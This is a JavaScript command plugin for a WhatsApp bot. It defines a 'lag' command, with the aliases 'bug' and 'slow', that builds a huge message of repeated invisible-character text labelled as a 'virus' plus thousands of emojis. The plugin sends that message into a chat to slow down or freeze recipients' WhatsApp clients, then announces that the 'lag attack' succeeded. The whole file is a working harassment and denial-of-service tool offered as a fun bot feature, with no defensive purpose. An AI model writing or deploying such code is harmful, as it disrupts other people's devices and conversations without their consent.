const { cmd } = require('../command');

cmd({
    pattern: "lag",
    alias: ["bug", "slow"],
    desc: "Send lag messages to slow down WhatsApp",
    category: "fun",
    react: "🐌",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        let bugText = "‏‏‎𝐌𝐑 𝐃𝐈𝐍𝐄𝐒𝐇 𝐕𝐈𝐑𝐔𝐒 ".repeat(10000); // Invisible character spam
        let emojiSpam = "⚠️".repeat(5000); // Emoji flood
        
        let spamMessage = `🔥 *WhatsApp Lag Attack* 🔥\n\n${bugText}\n${emojiSpam}`;
        
        await conn.sendMessage(from, { text: spamMessage }, { quoted: mek });
        reply("*Lag attack sent successfully! 🚀*");
    } catch (e) {
        console.log(e);
        reply("❌ *Error!* " + e.message);
    }
});
